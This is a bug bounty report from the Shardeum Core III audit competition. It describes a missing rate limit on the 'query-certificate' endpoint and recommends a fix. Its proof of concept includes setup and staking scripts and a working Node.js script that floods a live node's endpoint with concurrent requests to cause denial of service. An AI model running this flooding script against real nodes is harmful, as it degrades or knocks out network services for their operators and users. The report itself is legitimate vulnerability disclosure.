# #39913 \[BC-Medium] No rate Limiting in resource-intensive endpoint

**Submitted on Feb 10th 2025 at 17:35:57 UTC by @gladiator111 for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39913
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

`query-certificate` endpoint has no rate-limiting in place unlike other similar resource intensive endpoints

## Vulnerability Details

In the following endpoint there is no rate limiting implemented

```javascript
// @audit - No rate Limiting
shardus.registerExternalPut(
    'query-certificate',
    externalApiMiddleware,
    async (req: Request, res: Response) => {
      try {
        nestedCountersInstance.countEvent('shardeum-penalty', 'called query-certificate')
        const queryCertRes = await queryCertificateHandler(req, shardus)
        if (ShardeumFlags.VerboseLogs) console.log('queryCertRes', queryCertRes)
        if (queryCertRes.success) {
          const successRes = queryCertRes as CertSignaturesResult
          stakeCert = successRes.signedStakeCert
          /* prettier-ignore */ nestedCountersInstance.countEvent('shardeum-staking', `queryCertificateHandler success`)
        } else {
          /* prettier-ignore */ nestedCountersInstance.countEvent('shardeum-staking', `queryCertificateHandler failed with reason: ${(queryCertRes as ValidatorError).reason}`)
        }

       res.json(Utils.safeJsonParse(Utils.safeStringify(queryCertRes)))
      } catch (error) {
        /* prettier-ignore */ if (logFlags.error) console.error('Error in processing query-certificate request:', error)
        res.status(500).json({ error: 'Internal Server Error' })
      }
    }
  )
```

If we look at similar endpoints, rate limiting is applied. For example in the following endpoint : -

```javascript
shardus.registerExternalGet('eth_gasPrice', externalApiMiddleware, async (req, res) => {
     // rate limiting implemented here
    if (trySpendServicePoints(ShardeumFlags.ServicePoints['eth_gasPrice'], req, 'account') === false) {   
      res.json({ error: 'node busy' })
      return
    }

    try {
      const result = calculateGasPrice(
        ShardeumFlags.baselineTxFee,
        ShardeumFlags.baselineTxGasUsage,
        await AccountsStorage.getCachedNetworkAccount()
      )
      res.json({ result: `0x${result.toString(16)}` })
    } catch (error) {
      /* prettier-ignore */ if (logFlags.dapp_verbose) console.log('eth_gasPrice: ' + formatErrorMessage(error))
      res.json({ error })
    }
  })
```

The 'query-certificate' endpoint calls `queryCertificateHandler` which is a massive function, which verifies everything first, then queries the certificate and then gathers signatures from the nearest peers. This endpoint can be used for performing a DOS and increasing load on the node by continously querying certificate using the same request.

There is a second weakpoint also. The request can be sent by anybody, he just needs to sign it, as in the verification it only checks if the signature matches the payload and not if owner==nominee (Although this can be a design feature by shardeum so I am not heavily focusing on this point).

## Recommendation

Use `trySpendServicePoints` function to implement rate limiting in this endpoint.

## Impact Details

-> Increased strain on the node\
-> Endpoint can be used for DOS/DDOS

## References

<https://github.com/shardeum/shardeum/blob/167e48478403918468410dd7562929653d5b9f6b/src/index.ts#L2341-L2363>

## Proof of Concept

## Proof of Concept

The Proof of concept has the following flow -\
-> Spin up a node\
-> Stake for the node (on bb-testnet)\
-> Call the 'query-certificate' endpoint continously on any of the active node on the testnet

So first we have to spin up a node on the bb-testnet. We need to modify config.json in the shardeum repo first

```
diff -Naur a/config.json b/config.json
--- a/config.json	2025-02-10 22:23:02.445025200 +0530
+++ b/config.json	2025-02-10 22:19:36.391073600 +0530
@@ -4,20 +4,20 @@
       "p2p": {
         "existingArchivers": [
           {
-            "ip": "127.0.0.1",
+            "ip": "34.133.41.202",
             "port": 4000,
-            "publicKey": "758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3"
+            "publicKey": "bee6a1eba20fdaee1bd9a259fa293a529c8ae8afeed53fb3526eec9e02189351"
           }
         ]
       },
       "ip": {
         "externalIp": "127.0.0.1",
         "externalPort": 9001,
         "internalIp": "127.0.0.1",
         "internalPort": 10001
       },
       "reporting": {
-        "report": true,
+        "report": false,
         "recipient": "http://localhost:3000/api",
         "interval": 2,
         "console": false

```

We also need to add a get endpoint for easy signing, add the following to shardeum/src/index.ts

```typescript
shardus.registerExternalGet('signforobject', async(req,res) => {
    const certRequest = {
      nominee: req.query.publicKey,
      nominator: req.query.nominator,
    }
    let paylod = shardus.signAsNode(certRequest);
    res.json({data : paylod})
  })
```

Now let us spin up our node, compile the project and run `node ./dist/src/index.js`. This will spin up the node and will produce a secrets.json which contains our node's public and private key. Now let us stake some SHM.

```typescript
import { ethers } from "ethers";
import axios from "axios";

// Define the main asynchronous function
const main = async () => {
  try {
    // Initialize the provider
    const provider = new ethers.JsonRpcProvider(
      "http://34.132.212.252:8000",
      8082,
      { batchMaxCount: 1 }
    );

    // Initialize the wallet with the provider
    const walletWithProvider = new ethers.Wallet(
      "YOUR PRIVATE KEY HERE",    //ADD YOUR PRIVATE KEY HERE
      provider
    );

    // Define the required stake as a BigInt
    const stakeRequired = BigInt("0x8ac7230489e80000");

    // Sign the transaction
    const raw = await walletWithProvider.signTransaction({
      to: "0x0000000000000000000000000000000000010000",
      gasPrice: "30000",
      gasLimit: 30000000,
      value: stakeRequired,
      chainId: 8082,
      data: ethers.hexlify(
        ethers.toUtf8Bytes(
          JSON.stringify({
            isInternalTx: true,
            internalTXType: 6,   //InternalTXType.Stake
            nominator: walletWithProvider.address.toLowerCase(),
            timestamp: Date.now(),
            nominee: "YOUR NODE PUBLIC KEY HERE",    //CHANGE TO YOUR NODE'S PUBLIC KEY
            stake: { dataType: "bi", value: stakeRequired.toString(16) },
          })
        )
      ),
      nonce: await walletWithProvider.getNonce(),
    });

    // Inject the transaction
    const response = await axios.post("http://34.23.142.144:9001/inject", {  // random active node's ip
      raw,
      timestamp: Date.now(),
    });

    console.log("Transaction injected successfully:", response.data);
  } catch (error) {
    console.error("An error occurred:", error);
  }
};

// Execute the main function
main();
```

ok, so now staking done, now let us sign the payload.\
Signing the payload and sending requests can be done in one step but I did these separately, you can do it all at one time.

```javascript
const publickey = 'YOUR NODE PUBLIC KEY';
const nominator = 'YOUR NOMINATOR PUBLIC KEY'.toLowerCase();
const url = `http://127.0.0.1:9001/signforobject?publicKey=${encodeURIComponent(publickey)}&nominator=${encodeURIComponent(nominator)}`;

fetch(url)
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    sig = {nominee: data.data.nominee,
    nominator: data.data.nominator,
    sign: {
      owner: data.data.sign.owner,
      sig: data.data.sign.sig
    }
    }
    console.log(sig);
  })
  .catch(error => {
    if (error.response) {
      console.error('Error Status:', error.response.status);
      console.error('Error Data:', error.response.data);
    } else {
      console.error('Error:', error.message);
    }
  });
```

Now, we've got the signed payload, copy the payload from the terminal (from console.log) .\
Now run the following test with the following command

```
node proof_of_concept.js <ANY_ACTIVE_NODE_IP:PORT/'query-certificate'> '<PAYLOAD_JSON>' <CONCURRENCY> <TOTAL_REQUESTS>
```

```javascript
const axios = require('axios');

/**
 * Sends a single PUT request to the target URL with the specified payload.
 * @param {string} url - The target endpoint URL.
 * @param {object} payload - The JSON payload to send in the PUT request.
 */
const sendRequest = async (url, payload) => {
  try {
    const response = await axios.put(url, payload);
    console.log(`Status: ${response.status}, Response: ${JSON.stringify(response.data).substring(0, 100)}...`);
  } catch (error) {
    if (error.response) {
      console.log(`Status: ${error.response.status}, Response: ${JSON.stringify(error.response.data).substring(0, 100)}...`);
    } else {
      console.log(`Request failed: ${error.message}`);
    }
  }
};

/**
 * Initiates multiple concurrent PUT requests to the target URL.
 * @param {string} url - The target endpoint URL.
 * @param {object} payload - The JSON payload to send in each PUT request.
 * @param {number} concurrency - Number of concurrent requests.
 * @param {number} totalRequests - Total number of requests to send.
 */
const attack = async (url, payload, concurrency, totalRequests) => {
  let completed = 0;
  let active = 0;

  return new Promise((resolve) => {
    const sendBatch = () => {
      if (completed >= totalRequests) {
        if (active === 0) resolve();
        return;
      }

      while (active < concurrency && completed < totalRequests) {
        active++;
        completed++;
        sendRequest(url, payload)
          .then(() => {
            active--;
            sendBatch();
          })
          .catch(() => {
            active--;
            sendBatch();
          });
      }
    };

    sendBatch();
  });
};

/**
 * Main function to parse arguments and start the attack.
 */
const main = async () => {
  const args = process.argv.slice(2);
  if (args.length !== 4) {
    console.log('Usage: node proof_of_concept.js <target_url> <payload_json> <concurrency> <total_requests>');
    process.exit(1);
  }

  const [targetUrl, payloadStr, concurrencyStr, totalRequestsStr] = args;
  let payload;

  try {
    payload = JSON.parse(payloadStr);
  } catch (e) {
    console.log('Invalid JSON payload');
    process.exit(1);
  }

  const concurrency = parseInt(concurrencyStr, 10);
  const totalRequests = parseInt(totalRequestsStr, 10);

  if (isNaN(concurrency) || isNaN(totalRequests) || concurrency <= 0 || totalRequests <= 0) {
    console.log('Concurrency and total_requests must be positive integers');
    process.exit(1);
  }

  console.log(`Starting attack on ${targetUrl} with concurrency=${concurrency} for total_requests=${totalRequests}`);

  await attack(targetUrl, payload, concurrency, totalRequests);

  console.log('Attack completed');
};

main();
```

Note that this is just a simple script written in node, more sophisticated/specialized tools can also be used for greater effect.
